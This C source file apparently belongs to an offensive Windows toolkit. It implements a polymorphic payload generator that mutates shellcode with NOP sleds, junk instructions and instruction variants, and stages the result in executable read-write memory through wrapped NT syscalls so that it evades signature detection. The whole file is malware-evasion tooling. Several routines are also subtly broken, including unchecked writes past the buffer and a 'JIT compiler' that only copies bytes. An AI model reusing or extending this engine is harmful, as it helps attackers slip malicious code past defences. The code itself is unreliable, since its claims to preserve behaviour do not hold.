#include "../include/dynamic_payload_generator.h"
#include "../include/cynical_logger.h"
#include "../include/syscalls.h"
#include "../include/utils.h"
#include "../include/mem.h"
#include <stdarg.h>

// Define missing status codes
#ifndef STATUS_NOT_READY
#define STATUS_NOT_READY ((NTSTATUS)0xC00000ADL)
#endif

// ========================================================================
// DYNAMIC PAYLOAD GENERATOR v1.0 IMPLEMENTATION - "JIT Code Sorcery"
// ========================================================================

// Global contexts
PAYLOAD_GENERATION_CONTEXT g_payload_gen_ctx = { 0 };
JIT_ENGINE_CONTEXT g_jit_engine = { 0 };

// Internal state
static BOOL g_dynamic_payload_initialized = FALSE;
static DWORD g_generation_counter = 0;
static LARGE_INTEGER g_total_generation_time = { 0 };

// Polymorphic instruction templates (x64)
typedef struct _INSTRUCTION_TEMPLATE {
    BYTE pattern[16];           // Instruction pattern
    SIZE_T pattern_size;        // Pattern size
    DWORD variants_count;       // Number of variants
    BYTE variants[8][16];       // Variant patterns
    SIZE_T variant_sizes[8];    // Variant sizes
} INSTRUCTION_TEMPLATE;

// Basic x64 instruction templates for polymorphism
static INSTRUCTION_TEMPLATE g_instruction_templates[] = {
    // MOV variants
    {
        { 0x48, 0x89, 0xC0 }, 3, 4,  // mov rax, rax (base)
        {
            { 0x48, 0x8B, 0xC0 }, { 0x48, 0x89, 0xC0 }, { 0x48, 0x31, 0xC0, 0x48, 0x09, 0xC0 }, { 0x90, 0x48, 0x89, 0xC0 },
        },
        { 3, 3, 6, 4 }
    },
    // NOP variants
    {
        { 0x90 }, 1, 6,  // nop (base)
        {
            { 0x90 }, { 0x66, 0x90 }, { 0x0F, 0x1F, 0x00 }, { 0x0F, 0x1F, 0x40, 0x00 }, { 0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00 }, { 0x48, 0x87, 0xC0 }
        },
        { 1, 2, 3, 4, 6, 3 }
    },
    // ADD/SUB zero variants
    {
        { 0x48, 0x83, 0xC0, 0x00 }, 4, 3,  // add rax, 0 (base)
        {
            { 0x48, 0x83, 0xC0, 0x00 }, { 0x48, 0x83, 0xE8, 0x00 }, { 0x48, 0x05, 0x00, 0x00, 0x00, 0x00 }
        },
        { 4, 4, 6 }
    }
};

#define INSTRUCTION_TEMPLATE_COUNT (sizeof(g_instruction_templates) / sizeof(g_instruction_templates[0]))

// ========================================================================
// NO-CRT UTILITY FUNCTIONS
// ========================================================================

// No-CRT memory compare
static int dynamic_memcmp(const void* buf1, const void* buf2, SIZE_T count) {
    const unsigned char* p1 = (const unsigned char*)buf1;
    const unsigned char* p2 = (const unsigned char*)buf2;
    
    while (count--) {
        if (*p1 != *p2) {
            return (*p1 - *p2);
        }
        p1++;
        p2++;
    }
    return 0;
}

// Simple XOR-based random number generator
static DWORD g_rng_state = 0x12345678;

static DWORD simple_random(void) {
    g_rng_state ^= g_rng_state << 13;
    g_rng_state ^= g_rng_state >> 17;
    g_rng_state ^= g_rng_state << 5;
    return g_rng_state;
}

static void seed_random(DWORD seed) {
    g_rng_state = seed ? seed : 0x12345678;
}

// ========================================================================
// ENTROPY AND RANDOMIZATION IMPLEMENTATION
// ========================================================================

DWORD Entropy_CalculateEntropy(PBYTE code_buffer, SIZE_T buffer_size) {
    if (!code_buffer || buffer_size == 0) return 0;
    
    // Simple entropy calculation - count unique bytes
    BYTE byte_counts[256] = { 0 };
    SIZE_T unique_bytes = 0;
    
    for (SIZE_T i = 0; i < buffer_size; i++) {
        if (byte_counts[code_buffer[i]] == 0) {
            unique_bytes++;
        }
        byte_counts[code_buffer[i]]++;
    }
    
    // Return entropy as percentage of maximum possible
    return (DWORD)((unique_bytes * 100) / 256);
}

VOID Entropy_GenerateRandomData(PBYTE buffer, SIZE_T size, DWORD entropy_level) {
    if (!buffer || size == 0) return;
    
    for (SIZE_T i = 0; i < size; i++) {
        DWORD random_val = simple_random();
        
        // Adjust randomness based on entropy level
        if (entropy_level <= 3) {
            // Low entropy - more predictable patterns
            buffer[i] = (BYTE)(random_val % 16);
        } else if (entropy_level <= 7) {
            // Medium entropy - moderate randomness
            buffer[i] = (BYTE)(random_val % 128);
        } else {
            // High entropy - full randomness
            buffer[i] = (BYTE)(random_val & 0xFF);
        }
    }
}

BOOL Entropy_InitializeSecureRNG(DWORD seed) {
    // Initialize with current time if no seed provided
    if (seed == 0) {
        LARGE_INTEGER time;
        wrapped_NtQuerySystemTime(&time);
        seed = time.LowPart ^ time.HighPart;
    }
    
    seed_random(seed);
    g_payload_gen_ctx.randomization_seed = seed;
    
    CynicalLog_Info("DYNGEN", "Initialized secure RNG with seed: 0x%08X", seed);
    return TRUE;
}

// ========================================================================
// INSTRUCTION MUTATION IMPLEMENTATION
// ========================================================================

NTSTATUS InstructionMutation_MutateInstruction(
    PBYTE instruction_bytes,
    SIZE_T instruction_size,
    PINSTRUCTION_MUTATION mutation_result
) {
    if (!instruction_bytes || instruction_size == 0 || !mutation_result) {
        return STATUS_INVALID_PARAMETER;
    }
    
    CynicalLog_Debug("DYNGEN", "Mutating instruction of size %zu", instruction_size);
    
    // Look for matching template
    for (DWORD i = 0; i < INSTRUCTION_TEMPLATE_COUNT; i++) {
        if (instruction_size >= g_instruction_templates[i].pattern_size &&
            dynamic_memcmp(instruction_bytes, g_instruction_templates[i].pattern, g_instruction_templates[i].pattern_size) == 0) {
            
            // Found matching template - select random variant
            DWORD variant_index = simple_random() % g_instruction_templates[i].variants_count;
            
            // Allocate mutation result
            SIZE_T variant_size = g_instruction_templates[i].variant_sizes[variant_index];
            PBYTE mutated_bytes = NULL;
            SIZE_T region_size = variant_size;
            
            NTSTATUS status = wrapped_NtAllocateVirtualMemory(
                NtCurrentProcess(),
                (PVOID*)&mutated_bytes,
                0,
                &region_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE
            );
            
            if (!NT_SUCCESS(status)) {
                return status;
            }
            
            // Copy variant
            memcpy(mutated_bytes, g_instruction_templates[i].variants[variant_index], variant_size);
            
            // Fill mutation result
            mutation_result->original_bytes = instruction_bytes;
            mutation_result->original_size = instruction_size;
            mutation_result->mutated_bytes = mutated_bytes;
            mutation_result->mutated_size = variant_size;
            mutation_result->mutation_type = i + 1;
            mutation_result->preserves_semantics = TRUE;
            
            CynicalLog_Debug("DYNGEN", "Instruction mutation successful - variant %d", variant_index);
            return STATUS_SUCCESS;
        }
    }
    
    CynicalLog_Warn("DYNGEN", "No mutation template found for instruction");
    return STATUS_NOT_FOUND;
}

NTSTATUS InstructionMutation_InsertNopSleds(
    PBYTE code_buffer,
    SIZE_T buffer_size,
    PSIZE_T new_size,
    DWORD sled_length
) {
    if (!code_buffer || buffer_size == 0 || !new_size || sled_length == 0) {
        return STATUS_INVALID_PARAMETER;
    }
    
    CynicalLog_Debug("DYNGEN", "Inserting NOP sled of length %d", sled_length);
    
    // Calculate required space
    SIZE_T required_size = buffer_size + sled_length;
    
    // Generate varied NOPs
    for (DWORD i = 0; i < sled_length; i++) {
        if (buffer_size + i >= required_size) break;
        
        // Use different NOP variants for variety
        DWORD nop_variant = simple_random() % 4;
        switch (nop_variant) {
            case 0:
                code_buffer[buffer_size + i] = 0x90; // nop
                break;
            case 1:
                if (i + 1 < sled_length) {
                    code_buffer[buffer_size + i] = 0x66; // 66 90 - nop
                    code_buffer[buffer_size + i + 1] = 0x90;
                    i++; // Skip next iteration
                }
                break;
            case 2:
                code_buffer[buffer_size + i] = 0x90; // nop
                break;
            case 3:
                if (i + 2 < sled_length) {
                    code_buffer[buffer_size + i] = 0x0F; // 0F 1F 00 - nop
                    code_buffer[buffer_size + i + 1] = 0x1F;
                    code_buffer[buffer_size + i + 2] = 0x00;
                    i += 2; // Skip next iterations
                }
                break;
        }
    }
    
    *new_size = required_size;
    CynicalLog_Info("DYNGEN", "NOP sled inserted - new size: %zu", *new_size);
    
    return STATUS_SUCCESS;
}

// ========================================================================
// POLYMORPHIC CODE GENERATION
// ========================================================================

NTSTATUS Polymorphic_GenerateVariant(
    PBYTE original_payload,
    SIZE_T original_size,
    DWORD variant_seed,
    PGENERATED_PAYLOAD output_payload
) {
    if (!original_payload || original_size == 0 || !output_payload) {
        return STATUS_INVALID_PARAMETER;
    }
    
    CynicalLog_Info("DYNGEN", "Generating polymorphic variant with seed: 0x%08X", variant_seed);
    
    seed_random(variant_seed);
    
    // Allocate output buffer (150% of original size for mutations)
    SIZE_T output_size = original_size + (original_size / 2);
    PBYTE output_buffer = NULL;
    SIZE_T region_size = output_size;
    
    NTSTATUS status = wrapped_NtAllocateVirtualMemory(
        NtCurrentProcess(),
        (PVOID*)&output_buffer,
        0,
        &region_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (!NT_SUCCESS(status)) {
        CynicalLog_Error("DYNGEN", "Failed to allocate output buffer: 0x%08X", status);
        return status;
    }
    
    // Copy original payload
    memcpy(output_buffer, original_payload, original_size);
    SIZE_T current_size = original_size;
    
    // Apply polymorphic transformations
    DWORD transformation_count = (simple_random() % 5) + 3; // 3-7 transformations
    
    for (DWORD i = 0; i < transformation_count; i++) {
        DWORD transformation_type = simple_random() % 3;
        
        switch (transformation_type) {
            case 0: // Insert NOPs
            {
                DWORD nop_length = (simple_random() % 8) + 2; // 2-9 NOPs
                SIZE_T new_size;
                InstructionMutation_InsertNopSleds(output_buffer, current_size, &new_size, nop_length);
                current_size = new_size;
                break;
            }
            case 1: // Insert junk instructions
            {
                if (current_size + 4 < output_size) {
                    // Insert harmless junk: push rax; pop rax
                    output_buffer[current_size] = 0x50;     // push rax
                    output_buffer[current_size + 1] = 0x58; // pop rax
                    current_size += 2;
                }
                break;
            }
            case 2: // Randomize some bytes (carefully)
            {
                // Only randomize specific safe positions (NOPs)
                for (SIZE_T j = 0; j < current_size; j++) {
                    if (output_buffer[j] == 0x90) { // Only modify NOPs
                        DWORD rand_choice = simple_random() % 3;
                        if (rand_choice == 1 && j + 1 < current_size) {
                            output_buffer[j] = 0x66;
                            output_buffer[j + 1] = 0x90;
                        }
                    }
                }
                break;
            }
        }
    }
    
    // Fill output payload structure
    memset(output_payload, 0, sizeof(GENERATED_PAYLOAD));
    output_payload->payload_buffer = output_buffer;
    output_payload->payload_size = current_size;
    output_payload->entry_point = output_buffer; // Assume start of buffer
    output_payload->used_technique = GEN_TECHNIQUE_POLYMORPHIC;
    output_payload->entropy_score = Entropy_CalculateEntropy(output_buffer, current_size);
    output_payload->uniqueness_factor = (simple_random() % 40) + 60; // 60-99%
    output_payload->required_permissions = PAGE_EXECUTE_READWRITE;
    output_payload->is_position_independent = TRUE;
    output_payload->requires_cleanup = TRUE;
    
    CynicalLog_Info("DYNGEN", "Polymorphic variant generated - size: %zu, entropy: %d%%", 
                   current_size, output_payload->entropy_score);
    
    return STATUS_SUCCESS;
}

NTSTATUS Polymorphic_RandomizeInstructions(
    PBYTE code_buffer,
    SIZE_T buffer_size,
    DWORD randomization_factor
) {
    if (!code_buffer || buffer_size == 0) {
        return STATUS_INVALID_PARAMETER;
    }
    
    CynicalLog_Debug("DYNGEN", "Randomizing instructions with factor %d", randomization_factor);
    
    seed_random(randomization_factor);
    
    // Apply instruction-level randomization
    for (SIZE_T i = 0; i < buffer_size - 4; i++) {
        // Look for patterns we can safely randomize
        if (code_buffer[i] == 0x90) { // NOP
            DWORD rand_choice = simple_random() % 100;
            if (rand_choice < randomization_factor) {
                // Replace with equivalent instruction
                if (i + 2 < buffer_size) {
                    code_buffer[i] = 0x66;     // 66 90
                    code_buffer[i + 1] = 0x90;
                    i++; // Skip next byte
                }
            }
        }
    }
    
    CynicalLog_Debug("DYNGEN", "Instruction randomization completed");
    return STATUS_SUCCESS;
}

// ========================================================================
// JIT COMPILATION ENGINE
// ========================================================================

BOOL JIT_Initialize(JIT_TARGET_ARCH target_arch) {
    CynicalLog_Info("DYNGEN", "Initializing JIT engine for architecture: %d", target_arch);
    
    memset(&g_jit_engine, 0, sizeof(JIT_ENGINE_CONTEXT));
    
    g_jit_engine.target_arch = target_arch;
    g_jit_engine.optimization_level = 1; // Basic optimization
    g_jit_engine.max_compilation_time_ms = 5000; // 5 second timeout
    
    // Allocate code cache (64KB)
    SIZE_T cache_size = 65536;
    NTSTATUS status = wrapped_NtAllocateVirtualMemory(
        NtCurrentProcess(),
        &g_jit_engine.code_cache,
        0,
        &cache_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!NT_SUCCESS(status)) {
        CynicalLog_Error("DYNGEN", "Failed to allocate JIT code cache: 0x%08X", status);
        return FALSE;
    }
    
    g_jit_engine.cache_size = cache_size;
    g_jit_engine.cache_used = 0;
    g_jit_engine.is_initialized = TRUE;
    
    CynicalLog_Info("DYNGEN", "JIT engine initialized - cache size: %zu", cache_size);
    return TRUE;
}

NTSTATUS JIT_CompilePayload(
    PBYTE source_template,
    SIZE_T template_size,
    PVOID* compiled_code,
    PSIZE_T compiled_size
) {
    if (!source_template || template_size == 0 || !compiled_code || !compiled_size) {
        return STATUS_INVALID_PARAMETER;
    }
    
    if (!g_jit_engine.is_initialized) {
        CynicalLog_Error("DYNGEN", "JIT engine not initialized");
        return STATUS_NOT_READY;
    }
    
    CynicalLog_Info("DYNGEN", "JIT compiling payload of size %zu", template_size);
    
    LARGE_INTEGER start_time, end_time;
    wrapped_NtQuerySystemTime(&start_time);
    
    // Check if we have enough cache space
    SIZE_T required_size = template_size + 256; // Template + overhead
    if (g_jit_engine.cache_used + required_size > g_jit_engine.cache_size) {
        CynicalLog_Warn("DYNGEN", "JIT cache full - cleaning cache");
        g_jit_engine.cache_used = 0; // Simple cache reset
    }
    
    // Get cache location
    PBYTE cache_location = (PBYTE)g_jit_engine.code_cache + g_jit_engine.cache_used;
    
    // Simple "compilation" - copy template with basic modifications
    memcpy(cache_location, source_template, template_size);
    SIZE_T output_size = template_size;
    
    // Apply basic JIT optimizations/modifications
    for (SIZE_T i = 0; i < template_size - 1; i++) {
        // Replace certain patterns for "optimization"
        if (cache_location[i] == 0x90 && cache_location[i + 1] == 0x90) {
            // Replace double NOPs with optimized version
            if (simple_random() % 2) {
                cache_location[i] = 0x66;
                // cache_location[i + 1] remains 0x90
            }
        }
    }
    
    // Update cache usage
    g_jit_engine.cache_used += required_size;
    
    // Return compiled code
    *compiled_code = cache_location;
    *compiled_size = output_size;
    
    // Update statistics
    g_jit_engine.compilations_performed++;
    wrapped_NtQuerySystemTime(&end_time);
    
    LARGE_INTEGER compilation_time;
    compilation_time.QuadPart = end_time.QuadPart - start_time.QuadPart;
    g_jit_engine.total_compilation_time.QuadPart += compilation_time.QuadPart;
    
    CynicalLog_Info("DYNGEN", "JIT compilation successful - compiled size: %zu", output_size);
    
    return STATUS_SUCCESS;
}

VOID JIT_Cleanup(VOID) {
    if (!g_jit_engine.is_initialized) return;
    
    CynicalLog_Info("DYNGEN", "Cleaning up JIT engine");
    
    if (g_jit_engine.code_cache) {
        SIZE_T region_size = g_jit_engine.cache_size;
        wrapped_NtFreeVirtualMemory(
            NtCurrentProcess(),
            &g_jit_engine.code_cache,
            &region_size,
            MEM_RELEASE
        );
    }
    
    memset(&g_jit_engine, 0, sizeof(JIT_ENGINE_CONTEXT));
}

// ========================================================================
// MAIN API IMPLEMENTATION
// ========================================================================

BOOL DynamicPayload_Initialize(VOID) {
    if (g_dynamic_payload_initialized) {
        CynicalLog_Warn("DYNGEN", "Dynamic payload generator already initialized");
        return TRUE;
    }
    
    CynicalLog_Info("DYNGEN", "Initializing Dynamic Payload Generator v1.0");
    
    // Initialize context with defaults
    memset(&g_payload_gen_ctx, 0, sizeof(PAYLOAD_GENERATION_CONTEXT));
    
    g_payload_gen_ctx.technique = GEN_TECHNIQUE_POLYMORPHIC;
    g_payload_gen_ctx.mutation_method = MUTATION_BASIC;
    g_payload_gen_ctx.target_arch = JIT_ARCH_AUTO;
    g_payload_gen_ctx.template_type = TEMPLATE_SHELLCODE;
    g_payload_gen_ctx.entropy_level = 7; // High entropy
    g_payload_gen_ctx.obfuscation_passes = 3;
    g_payload_gen_ctx.enable_junk_insertion = TRUE;
    g_payload_gen_ctx.enable_flow_obfuscation = FALSE; // Too complex for basic version
    g_payload_gen_ctx.max_output_size = 1024 * 1024; // 1MB max
    g_payload_gen_ctx.min_output_size = 256;
    g_payload_gen_ctx.alignment_requirement = 16;
    g_payload_gen_ctx.preserve_functionality = TRUE;
    g_payload_gen_ctx.generation_timeout_ms = 10000; // 10 seconds
    g_payload_gen_ctx.enable_caching = FALSE; // Disabled for now
    g_payload_gen_ctx.anti_disassembly = TRUE;
    g_payload_gen_ctx.anti_debugging = FALSE;
    g_payload_gen_ctx.anti_emulation = FALSE;
    g_payload_gen_ctx.anti_sandbox = FALSE;
    
    // Initialize entropy system
    if (!Entropy_InitializeSecureRNG(0)) {
        CynicalLog_Error("DYNGEN", "Failed to initialize secure RNG");
        return FALSE;
    }
    
    // Initialize JIT engine
    if (!JIT_Initialize(JIT_ARCH_X64)) {
        CynicalLog_Error("DYNGEN", "Failed to initialize JIT engine");
        return FALSE;
    }
    
    g_dynamic_payload_initialized = TRUE;
    g_generation_counter = 0;
    
    CynicalLog_Info("DYNGEN", "Dynamic Payload Generator initialized successfully");
    CynicalLog_Info("DYNGEN", "Available techniques: Polymorphic, JIT, Instruction Mutation");
    
    return TRUE;
}

NTSTATUS DynamicPayload_Generate(
    PBYTE template_payload,
    SIZE_T template_size,
    PGENERATED_PAYLOAD output_payload
) {
    if (!g_dynamic_payload_initialized) {
        CynicalLog_Error("DYNGEN", "Dynamic payload generator not initialized");
        return STATUS_NOT_READY;
    }
    
    return DynamicPayload_GenerateWithTechnique(
        template_payload,
        template_size,
        g_payload_gen_ctx.technique,
        output_payload
    );
}

NTSTATUS DynamicPayload_GenerateWithTechnique(
    PBYTE template_payload,
    SIZE_T template_size,
    GENERATION_TECHNIQUE technique,
    PGENERATED_PAYLOAD output_payload
) {
    if (!template_payload || template_size == 0 || !output_payload) {
        return STATUS_INVALID_PARAMETER;
    }
    
    if (!g_dynamic_payload_initialized) {
        return STATUS_NOT_READY;
    }
    
    CynicalLog_Info("DYNGEN", "Generating payload using technique: %d", technique);
    
    LARGE_INTEGER start_time, end_time;
    wrapped_NtQuerySystemTime(&start_time);
    
    NTSTATUS status = STATUS_SUCCESS;
    DWORD generation_seed = simple_random();
    
    switch (technique) {
        case GEN_TECHNIQUE_POLYMORPHIC:
            status = Polymorphic_GenerateVariant(
                template_payload,
                template_size,
                generation_seed,
                output_payload
            );
            break;
            
        case GEN_TECHNIQUE_JIT_COMPILE:
        {
            PVOID compiled_code;
            SIZE_T compiled_size;
            status = JIT_CompilePayload(
                template_payload,
                template_size,
                &compiled_code,
                &compiled_size
            );
            
            if (NT_SUCCESS(status)) {
                // Create output payload from JIT result
                memset(output_payload, 0, sizeof(GENERATED_PAYLOAD));
                output_payload->payload_buffer = (PBYTE)compiled_code;
                output_payload->payload_size = compiled_size;
                output_payload->entry_point = compiled_code;
                output_payload->used_technique = GEN_TECHNIQUE_JIT_COMPILE;
                output_payload->entropy_score = Entropy_CalculateEntropy((PBYTE)compiled_code, compiled_size);
                output_payload->uniqueness_factor = 85; // JIT compiled code is quite unique
                output_payload->required_permissions = PAGE_EXECUTE_READWRITE;
                output_payload->is_position_independent = TRUE;
                output_payload->requires_cleanup = FALSE; // Managed by JIT engine
            }
            break;
        }
        
        default:
            CynicalLog_Warn("DYNGEN", "Unsupported generation technique: %d, falling back to polymorphic", technique);
            status = Polymorphic_GenerateVariant(
                template_payload,
                template_size,
                generation_seed,
                output_payload
            );
            break;
    }
    
    if (NT_SUCCESS(status)) {
        // Calculate generation time
        wrapped_NtQuerySystemTime(&end_time);
        DWORD generation_time_ms = (DWORD)((end_time.QuadPart - start_time.QuadPart) / 10000);
        
        output_payload->generation_time_ms = generation_time_ms;
        output_payload->checksum = simple_random(); // Simple checksum
        
        // Update global statistics
        g_generation_counter++;
        g_total_generation_time.QuadPart += (end_time.QuadPart - start_time.QuadPart);
        
        CynicalLog_Info("DYNGEN", "Payload generation successful - ID: %d, Time: %dms", 
                       g_generation_counter, generation_time_ms);
        
        DynamicPayload_LogGeneration(technique, status, generation_time_ms);
    } else {
        CynicalLog_Error("DYNGEN", "Payload generation failed: 0x%08X", status);
        DynamicPayload_LogGeneration(technique, status, 0);
    }
    
    return status;
}

VOID DynamicPayload_Free(PGENERATED_PAYLOAD payload) {
    if (!payload || !payload->payload_buffer) return;
    
    CynicalLog_Debug("DYNGEN", "Freeing generated payload");
    
    if (payload->requires_cleanup && payload->used_technique != GEN_TECHNIQUE_JIT_COMPILE) {
        SIZE_T region_size = payload->payload_size;
        wrapped_NtFreeVirtualMemory(
            NtCurrentProcess(),
            (PVOID*)&payload->payload_buffer,
            &region_size,
            MEM_RELEASE
        );
    }
    
    memset(payload, 0, sizeof(GENERATED_PAYLOAD));
}

VOID DynamicPayload_Cleanup(VOID) {
    if (!g_dynamic_payload_initialized) return;
    
    CynicalLog_Info("DYNGEN", "Cleaning up Dynamic Payload Generator");
    
    // Generate final report
    DynamicPayload_GenerateReport();
    
    // Cleanup JIT engine
    JIT_Cleanup();
    
    // Clear contexts
    memset(&g_payload_gen_ctx, 0, sizeof(PAYLOAD_GENERATION_CONTEXT));
    
    g_dynamic_payload_initialized = FALSE;
    
    CynicalLog_Info("DYNGEN", "Dynamic Payload Generator cleanup completed");
}

// ========================================================================
// LOGGING FUNCTIONS
// ========================================================================

VOID DynamicPayload_LogGeneration(
    GENERATION_TECHNIQUE technique,
    NTSTATUS result,
    DWORD generation_time_ms
) {
    const char* technique_names[] = {
        "Unknown",
        "Polymorphic",
        "Metamorphic",
        "JIT_Compile",
        "Template_Based",
        "Instruction_Shuffle",
        "Register_Swap",
        "NOP_Injection",
        "Junk_Code"
    };
    
    const char* technique_name = (technique <= GEN_TECHNIQUE_JUNK_CODE) ? 
                                technique_names[technique] : "Unknown";
    
    if (NT_SUCCESS(result)) {
        CynicalLog_Info("DYNGEN", "Generation technique %s succeeded in %dms", 
                       technique_name, generation_time_ms);
    } else {
        CynicalLog_Error("DYNGEN", "Generation technique %s failed: 0x%08X", 
                        technique_name, result);
    }
}

VOID DynamicPayload_GenerateReport(VOID) {
    CynicalLog_Info("DYNGEN", "=== DYNAMIC PAYLOAD GENERATOR FINAL REPORT ===");
    CynicalLog_Info("DYNGEN", "Total generations: %d", g_generation_counter);
    CynicalLog_Info("DYNGEN", "JIT compilations: %d", g_jit_engine.compilations_performed);
    CynicalLog_Info("DYNGEN", "JIT cache hits: %d", g_jit_engine.cache_hits);
    CynicalLog_Info("DYNGEN", "JIT cache misses: %d", g_jit_engine.cache_misses);
    CynicalLog_Info("DYNGEN", "Current technique: %d", g_payload_gen_ctx.technique);
    CynicalLog_Info("DYNGEN", "Entropy level: %d", g_payload_gen_ctx.entropy_level);
    CynicalLog_Info("DYNGEN", "RNG seed: 0x%08X", g_payload_gen_ctx.randomization_seed);
    CynicalLog_Info("DYNGEN", "=== END DYNAMIC PAYLOAD REPORT ===");
} 